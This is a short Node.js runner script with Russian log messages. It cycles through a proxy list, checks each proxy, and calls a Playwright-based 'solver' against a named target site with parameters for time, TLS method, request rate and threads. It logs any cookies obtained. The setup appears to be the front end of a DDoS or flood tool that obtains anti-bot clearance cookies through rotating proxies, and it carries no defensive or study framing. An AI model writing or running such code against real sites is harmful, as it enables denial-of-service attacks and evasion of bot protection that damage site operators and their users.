const { solverInstance } = require('./playwright.js');
const fs = require('fs');
const readline = require('readline');

const baseArgs = {
  Target: "https://www.amg24.bot/",
  Time: "400",
  Method: "TLSv1",
  Rate: "80",
  Threads: 10
};

(async () => {
  const fileStream = fs.createReadStream('./proxies.txt');
  const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity });

  for await (const line of rl) {
    const proxy = line.trim();
    if (!proxy || proxy.startsWith('#')) continue;

    const [ip, port] = proxy.split(':');
    const isAlive = await checkProxy(ip, port);
    if (!isAlive) {
      console.log(`(ProxyCheck.red) ${proxy} не рабочий`);
      continue;
    }

    const args = { ...baseArgs, Proxy: proxy };
    console.log(`(Runner.green) Запуск solverInstance для прокси: ${proxy}`);
    try {
      const cookies = await solverInstance(args);
      console.log(`(Runner.green) Успех, куки: ${cookies}`);
      break; // или не ломай и продолжай по списку
    } catch (e) {
      console.error(`(Runner.red) Ошибка для ${proxy}: ${e.message}`);
    }
  }
})().catch(err => console.error(err));

async function checkProxy(ip, port) {
  return new Promise(resolve => {
    const net = require('net');
    const sock = new net.Socket();
    sock.setTimeout(3000);
    sock.on('connect', () => { sock.destroy(); resolve(true); });
    sock.on('error', () => resolve(false));
    sock.on('timeout', () => resolve(false));
    sock.connect(port, ip);
  });
}